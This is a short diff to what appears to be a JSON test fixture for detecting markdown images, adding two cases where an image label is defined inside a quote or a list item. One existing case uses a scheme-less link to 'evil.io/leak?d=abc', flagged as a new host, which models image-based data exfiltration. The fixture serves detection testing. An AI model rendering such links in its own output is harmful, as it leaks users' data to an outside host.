@@ -29,6 +29,8 @@
   {"name": "an image whose text runs over two lines", "parts": ["![build\nstatus](https://github.com/acme/game/badge.svg)"], "flags": ["image"]},
   {"name": "an image by its label alone", "parts": ["![logo]\n\n[logo]: https://github.com/acme/logo.png"], "flags": ["image"]},
   {"name": "an image by its label alone, defined without a scheme", "parts": ["![a]\n\n[a]: //evil.io/leak?d=abc"], "flags": ["new_host", "image"]},
+  {"name": "an image by its label alone, defined in a quote", "parts": ["![logo]\n\n> [logo]: https://github.com/acme/logo.png"], "flags": ["image"]},
+  {"name": "an image by its label alone, defined in a list item", "parts": ["![logo]\n\n1. [logo]: https://github.com/acme/logo.png"], "flags": ["image"]},
   {"name": "an image by its label alone, defined in another paragraph", "parts": ["![logo]", "[Logo]: https://github.com/acme/logo.png"], "flags": ["image"]},
   {"name": "an image in HTML", "parts": ["<IMG src=\"https://github.com/acme/a.png\">"], "flags": ["image"]},
   {"name": "an image as data", "parts": ["![x](data:image/gif;base64,R0lGOD)"], "flags": ["image"]},
